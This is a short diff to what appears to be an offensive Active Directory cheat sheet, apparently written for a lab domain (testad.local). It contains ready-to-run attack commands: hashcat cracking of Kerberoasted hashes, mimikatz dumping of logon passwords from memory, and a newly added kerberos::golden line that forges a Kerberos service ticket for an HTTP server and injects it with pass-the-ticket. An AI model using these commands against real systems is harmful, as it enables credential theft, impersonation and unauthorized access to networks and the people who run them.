@@ -602,4 +602,6 @@ sudo hashcat -m 13100 kerberoasted.hashes /home/user/tools/wordlists/rockyou.txt
 privilege::debug
 sekurlsa::logonpasswords
 #The Domain SID can be obtained from the previous or by issuing whoami /user (remember to omit RID (the last part))
-#
+#You can use the enumhelper.ps1 to list SPNs, but you should already be aware of the SPN you're targeting
+#Now to incject the ticket into hosts memory (/ptt)
+kerberos::golden /sid:S-1-5-21-809893099-1472282828-2400958209 /domain:testad.local /ptt /target:www01.testad.local /service:http /rc4:1c23dg4567e89012345678b90123db45 /user:username
